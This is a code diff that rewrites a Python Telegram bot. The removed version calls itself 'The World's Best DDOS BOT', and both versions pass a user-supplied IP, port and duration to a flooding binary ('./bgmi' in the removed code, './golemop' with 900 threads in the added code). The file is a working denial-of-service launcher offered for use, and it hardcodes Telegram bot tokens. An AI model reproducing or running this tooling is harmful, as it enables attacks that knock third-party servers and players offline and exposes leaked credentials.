@@ -1,350 +1,119 @@
-#!/usr/bin/python3
-import telebot
-import datetime
-import time
 import subprocess
-import random
-import aiohttp
-import threading
-import random
-# Insert your Telegram bot token here
-bot = telebot.TeleBot('7758503902:AAH2ne_9aqxByVKJ9lg3k3UBQhScms8kGAY') #bot token dalo
+from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
 
+# Path to your binary
+BINARY_PATH = "./golemop"
 
-# Admin user IDs
-admin_id = ["7792814115"]
+# Global variables
+process = None
+target_ip = None
+target_port = None
+attack_time = 900  # Default time
+threads = 900  # Default thread count
 
-# Group and channel details
-GROUP_ID = "-1002561936370"            #group id dalo
-CHANNEL_USERNAME = "@Gx7_chat"         #channel username 
+# Start command: Show Attack button
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[KeyboardButton("ATTACK")]]
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    await update.message.reply_text("PRESS THE ATTACK BUTTON TO START CONFIGURING THE ATTACK.", reply_markup=reply_markup)
 
-# Default cooldown and attack limits
-COOLDOWN_TIME = 60  # Cooldown in seconds
-ATTACK_LIMIT = 5 # Max attacks per day
-global_pending_attack = None
-global_last_attack_time = None
-pending_feedback = {}  # यूजर 
-
-# Files to store user data
-USER_FILE = "users.txt"
-
-# Dictionary to store user states
-user_data = {}
-global_last_attack_time = None  # Global cooldown tracker
-
-# 🎯 Random Image URLs  
-image_urls = [
-    "https://envs.sh/g7a.jpg",
-    "https://envs.sh/g7O.jpg",
-    "https://envs.sh/g7_.jpg",
-    "https://envs.sh/gHR.jpg",
-    "https://envs.sh/gH4.jpg",
-    "https://envs.sh/gHU.jpg",
-    "https://envs.sh/gHl.jpg",
-    "https://envs.sh/gH1.jpg",
-    "https://envs.sh/gHk.jpg",
-    "https://envs.sh/68x.jpg",
-    "https://envs.sh/67E.jpg",
-    "https://envs.sh/67Q.jpg",
-    "https://envs.sh/686.jpg",
-    "https://envs.sh/68V.jpg",
-    "https://envs.sh/68-.jpg",
-    "https://envs.sh/Vwn.jpg",
-    "https://envs.sh/Vwe.jpg",
-    "https://envs.sh/VwZ.jpg",
-    "https://envs.sh/VwG.jpg",
-    "https://envs.sh/VwK.jpg",
-    "https://envs.sh/VwA.jpg",
-    "https://envs.sh/Vw_.jpg",
-    "https://envs.sh/Vwc.jpg"
-]
-
-def is_user_in_channel(user_id):
-    return True  # **यहीं पर Telegram API से चेक कर सकते हो**
-# Function to load user data from the file
-def load_users():
+# Handle user input for IP and port
+async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global target_ip, target_port
     try:
-        with open(USER_FILE, "r") as file:
-            for line in file:
-                user_id, attacks, last_reset = line.strip().split(',')
-                user_data[user_id] = {
-                    'attacks': int(attacks),
-                    'last_reset': datetime.datetime.fromisoformat(last_reset),
-                    'last_attack': None
-                }
-    except FileNotFoundError:
-        pass
+        # User input is expected in the format: <target> <port>
+        target, port = update.message.text.split()
+        target_ip = target
+        target_port = int(port)
 
-# Function to save user data to the file
-def save_users():
-    with open(USER_FILE, "w") as file:
-        for user_id, data in user_data.items():
-            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")
-
-# Middleware to ensure users are joined to the channel
-def is_user_in_channel(user_id):
-    try:
-        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
-        return member.status in ['member', 'administrator', 'creator']
-    except:
-        return False
-@bot.message_handler(commands=['attack'])
-def handle_attack(message):
-    global global_last_attack_time
-
-    user_id = str(message.from_user.id)
-    user_name = message.from_user.first_name
-    command = message.text.split()
-
-    if message.chat.id != int(GROUP_ID):
-        bot.reply_to(message, f"🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌\n🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: {CHANNEL_USERNAME}")
-        return
-
-    if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"❗ **𝐏𝐀𝐇𝐋𝐄 𝐉𝐎𝐈𝐍 𝐊𝐑𝐎** {CHANNEL_USERNAME} 🔥")
-        return
-
-    if pending_feedback.get(user_id, False):
-        bot.reply_to(message, "😡 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄 𝐏𝐀𝐇𝐋𝐄!** 🔥\n🚀 *𝐀𝐆𝐋𝐀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐆𝐀𝐍𝐄 𝐊𝐄 𝐋𝐈𝐞 𝐒𝐀𝐁𝐈𝐓 𝐊𝐑𝐎 𝐊𝐈 𝐏𝐈𝐂 𝐃𝐀𝐋𝐈!*")
-        return
-
-    # Check if an attack is already running
-    if is_attack_running(user_id):
-        bot.reply_to(message, "⚠️ **𝐑𝐔𝐊 𝐁𝐄 𝐁𝐇𝐀𝐈, 𝐄𝐊 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐇𝐀𝐋 𝐑𝐇𝐀 𝐇𝐀𝐈!** ⚡")
-        return
-
-    if user_id not in user_data:
-        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}
-
-    user = user_data[user_id]
-    if user['attacks'] >= ATTACK_LIMIT:
-        bot.reply_to(message, f"❌ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐈𝐌𝐈𝐓 𝐎𝐕𝐄𝐑!** ❌\n🔄 *𝐓𝐑𝐘 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖!*")
-        return
-
-    if len(command) != 4:
-        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /attack `<IP>` `<PORT>` `<TIME>`")
-        return
-
-    target, port, time_duration = command[1], command[2], command[3]
-
-    try:
-        port = int(port)
-        time_duration = int(time_duration)
+        # Show Start, Stop, and Reset buttons after input is received
+        keyboard = [
+            [KeyboardButton("677ms"), KeyboardButton("20ms")],
+            [KeyboardButton("RESET")]
+        ]
+        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+        await update.message.reply_text(
+            f"TARGET IP: {target_ip}, PORT: {target_port}\nTIME: {attack_time}\nTHREADS: {threads}\nFILE DEVELOPER = @GOLEM_OWNER"
+            "NOW CHOOSE AN ACTION:",
+            reply_markup=reply_markup
+        )
     except ValueError:
-        bot.reply_to(message, "❌ **𝐄𝐑𝐑𝐎𝐑:** 𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!")
+        await update.message.reply_text("Invalid format. Please enter in the format: <target> <port>")
+
+# Start the attack
+async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global process, target_ip, target_port, attack_time, threads
+    if not target_ip or not target_port:
+        await update.message.reply_text("Please configure the target and port first.")
         return
 
-    if time_duration > 201:
-        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 200𝐬!**")
+    if process and process.poll() is None:
+        await update.message.reply_text("Attack is already running.")
         return
-
-    # Get the user's profile picture
-    profile_photos = bot.get_user_profile_photos(user_id)
-    if profile_photos.total_count > 0:
-        profile_pic = profile_photos.photos[0][-1].file_id
-    else:
-        # Ask the user to set a profile picture
-        bot.reply_to(message, "❌ **𝐓𝐎𝐃𝐀𝐘 𝐁𝐇𝐀𝐈, 𝐎𝐇 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐏𝐈𝐂 𝐃𝐀𝐋𝐈𝐍𝐄!** 🔥\n📸 *𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐄𝐓 𝐀 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐏𝐈𝐂𝐓𝐔𝐑𝐄 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊!*")
-        return
-
-    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
-    random_image = random.choice(image_urls)
-
-    # Send profile picture and attack start message together
-    bot.send_photo(message.chat.id, profile_pic, caption=f"👤 **User:** @{user_name} 🚀\n"
-                                                        f"💥 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!** 💥\n"
-                                                        f"🎯 **𝐓𝐀𝐑𝐆𝐄𝐓:** `{target} : {port}`\n"
-                                                        f"⏳ **𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍:** {time_duration}𝙨\n"
-                                                        f"⚡ **𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊𝐒:** {remaining_attacks}\n"
-                                                        f"📸 **𝐆𝐀𝐌𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐁𝐇𝐄𝐉 𝐃𝐄!**\n"
-                                                        f"⏳ **𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒: 0%**")
-
-    pending_feedback[user_id] = True  
-
-    full_command = f"./bgmi {target} {port} {time_duration} 400"
 
     try:
-        subprocess.run(full_command, shell=True, check=True)
-    except subprocess.CalledProcessError as e:
-        bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
-        pending_feedback[user_id] = False
-        return
-
-    # Update progress bar to 100% and close pop-up
-    bot.send_message(message.chat.id, 
-                     f"✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄!** ✅\n"
-                     f"🎯 `{target}:{port}` **𝐃𝐄𝐒𝐓𝐑𝐎𝐘𝐄𝐃!**\n"
-                     f"⏳ **𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍:** {time_duration}𝙨\n"
-                     f"⚡ **𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊𝐒:** {remaining_attacks}\n"
-                     f"⏳ **𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒: 100%**")
-
-    threading.Thread(target=send_attack_finished, args=(message, user_name, target, port, time_duration, remaining_attacks)).start()
-
-
-def is_attack_running(user_id):
-    """
-    Checks if the user is currently running an attack.
-    """
-    return user_id in pending_feedback and pending_feedback[user_id] == True
-
-
-def send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks):
-    bot.send_message(message.chat.id, 
-                     f"🚀 **𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐄𝐀𝐃𝐘!** ⚡")
-    
-    bot.send_message(message.chat.id, "🚀 **𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐄𝐀𝐃𝐘!** ⚡")
-    
-@bot.message_handler(commands=['check_cooldown'])
-def check_cooldown(message):
-    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
-        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
-        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
-    else:
-        bot.reply_to(message, "No global cooldown. You can initiate an attack.")
-
-# Command to check remaining attacks for a user
-@bot.message_handler(commands=['check_remaining_attack'])
-def check_remaining_attack(message):
-    user_id = str(message.from_user.id)
-    if user_id not in user_data:
-        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
-    else:
-        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
-        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")
-
-# Admin commands
-@bot.message_handler(commands=['reset'])
-def reset_user(message):
-    if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "Only admins can use this command.")
-        return
-
-    command = message.text.split()
-    if len(command) != 2:
-        bot.reply_to(message, "Usage: /reset <user_id>")
-        return
-
-    user_id = command[1]
-    if user_id in user_data:
-        user_data[user_id]['attacks'] = 0
-        save_users()
-        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
-    else:
-        bot.reply_to(message, f"No data found for user {user_id}.")
-
-@bot.message_handler(commands=['setcooldown'])
-def set_cooldown(message):
-    if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "Only admins can use this command.")
-        return
-
-    command = message.text.split()
-    if len(command) != 2:
-        bot.reply_to(message, "Usage: /setcooldown <seconds>")
-        return
-
-    global COOLDOWN_TIME
-    try:
-        COOLDOWN_TIME = int(command[1])
-        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
-    except ValueError:
-        bot.reply_to(message, "Please provide a valid number of seconds.")
-
-@bot.message_handler(commands=['viewusers'])
-def view_users(message):
-    if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "Only admins can use this command.")
-        return
-
-    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
-                           for user_id, data in user_data.items()])
-    bot.reply_to(message, f"User Summary:\n\n{user_list}")
-    
-
-# Dictionary to store feedback counts per user
-feedback_count_dict = {}
-
-@bot.message_handler(content_types=['photo'])
-def handle_screenshot(message):
-    user_id = str(message.from_user.id)
-    user_name = message.from_user.first_name
-    feedback_count = feedback_count_dict.get(user_id, 0) + 1  # Increment feedback count for the user
-
-    # Update feedback count in the dictionary
-    feedback_count_dict[user_id] = feedback_count
-
-    # 🚀 Check if user is in channel  
-    try:
-        user_status = bot.get_chat_member(CHANNEL_USERNAME, user_id).status
-        if user_status not in ['member', 'administrator', 'creator']:
-            bot.reply_to(message, f"❌ **𝐘𝐨𝐮 𝐌𝐔𝐒𝐓 𝐉𝐎𝐈𝐍 𝐎𝐔𝐑 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐅𝐈𝐑𝐒𝐓!**\n"
-                                  f"🔗 **𝐉𝐨𝐢𝐧 𝐇𝐞𝐫𝐞:** [Click Here]{CHANNEL_USERNAME}")
-            return  
+        # Run the binary with target, port, time, and threads
+        process = subprocess.Popen(
+            [BINARY_PATH, target_ip, str(target_port), str(attack_time), str(threads)],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
+        await update.message.reply_text(f"STARTED ATTACK ON\n⚡TARGET IP⚡ {target_ip} ⚡TARGET PORT⚡ {target_port}\n⚡SECOND⚡{attack_time}\n⚡THREADS⚡{threads}\n\nFILE DEVELOPER = @GOLEM_OWNER")
     except Exception as e:
-        bot.reply_to(message, "❌ **𝐂𝐨𝐮𝐥𝐝 𝐍𝐨𝐭 𝐕𝐞𝐫𝐢𝐟𝐲! 𝐌𝐚𝐤𝐞 𝐒𝐮𝐫𝐞 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐈𝐬 𝐀𝐝𝐦𝐢𝐧 𝐈𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥.**")
-        return  
+        await update.message.reply_text(f"ERROR STARTING ATTACK: {e}")
 
-    # ✅ Proceed If User is in Channel
-    if pending_feedback.get(user_id, False):
-        pending_feedback[user_id] = False  
+# Stop the attack
+async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global process
+    if not process or process.poll() is not None:
+        await update.message.reply_text("NO ATTACK IS CURRENTLY RUNNING.")
+        return
 
-        # 🚀 Forward Screenshot to Channel  
-        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)
+    process.terminate()
+    process.wait()
+    await update.message.reply_text("ATTACK STOPPED.\nFILE DEVELOPER = @GOLEM_OWNER")
 
-        # 🔥 Send Confirmation with SS Number  
-        bot.send_message(CHANNEL_USERNAME, 
-                         f"📸 **𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃!**\n"
-                         f"👤 **𝐔𝐒𝐄𝐑:** `{user_name}`\n"
-                         f"🆔 **𝐈𝐃:** `{user_id}`\n"
-                         f"🔢 **𝐒𝐒 𝐍𝐨.:** `{feedback_count}`")
+# Reset the attack
+async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global process, target_ip, target_port
+    if process and process.poll() is not None:
+        process.terminate()
+        process.wait()
 
-        bot.reply_to(message, "✅ **𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐀𝐂𝐂𝐄𝐏𝐓𝐄𝐃! 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐄𝐀𝐃𝐘!** 🚀")
+    target_ip = None
+    target_port = None
+    await update.message.reply_text("ATTACK RESET. PLEASE CONFIGURE A NEW TARGET AND PORT.")
+
+# Handle user actions for start/stop/reset
+async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_text = update.message.text
+
+    if user_text == "677ms":
+        await start_attack(update, context)
+    elif user_text == "20ms":
+        await stop_attack(update, context)
+    elif user_text == "RESET":
+        await reset_attack(update, context)
     else:
-        bot.reply_to(message, "❌ **𝐓𝐇𝐈𝐒 𝐈𝐒 𝐍𝐎𝐓 𝐀 𝐕𝐀𝐋𝐈𝐃 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄!**")
-@bot.message_handler(commands=['start'])
-def welcome_start(message):
-    user_name = message.from_user.first_name
-    response = f"""🌟🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐑𝐎 {user_name} 🔥🌟
-    
-🚀 **𝐘𝐨𝐮'𝐫𝐞 𝐢𝐧 𝐓𝐡𝐞 𝐇𝐎𝐌𝐄 𝐨𝐟 𝐏𝐎𝐖𝐄𝐑!**  
-💥 𝐓𝐡𝐞 𝐖𝐎𝐑𝐋𝐃'𝐒 𝐁𝐄𝐒𝐓 **DDOS BOT** 🔥  
-⚡ 𝐁𝐄 𝐓𝐇𝐄 𝐊𝐈𝐍𝐆, 𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐄 𝐓𝐇𝐄 𝐖𝐄𝐁!  
+        # If the input doesn't match any action, treat it as input for IP and port
+        await handle_input(update, context)
 
-🔗 **𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭, 𝐉𝐨𝐢𝐧 𝐍𝐨𝐰:**  
-👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/+fxKFdQNW8VgyZDE1) 🚀🔥"""
-    
-    bot.reply_to(message, response, parse_mode="Markdown")
-# Function to reset daily limits automatically
-def auto_reset():
-    while True:
-        now = datetime.datetime.now()
-        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
-        time.sleep(seconds_until_midnight)
-        for user_id in user_data:
-            user_data[user_id]['attacks'] = 0
-            user_data[user_id]['last_reset'] = datetime.datetime.now()
-        save_users()
+# Main function to start the bot
+def main():
+    # Your Telegram bot token
+    TOKEN = "7691481774:AAEjPpn3etRRV5xJUkikRvxR7_zu99L02ZU"
 
-# Start auto-reset in a separate thread
-reset_thread = threading.Thread(target=auto_reset, daemon=True)
-reset_thread.start()
+    # Create Application object with your bot's token
+    application = Application.builder().token(TOKEN).build()
 
-# Load user data on startup
-load_users()
+    # Register command handler for /start
+    application.add_handler(CommandHandler("start", start))
 
+    # Register message handler for handling input and actions
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_action))
 
-#bot.polling()
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(e)
-        # Add a small delay to avoid rapid looping in case of persistent errors
-        time.sleep(15)
-        
-        
- 
+    # Start the bot
+    application.run_polling()
 
-
-
-
+if __name__ == "__main__":
+    main()
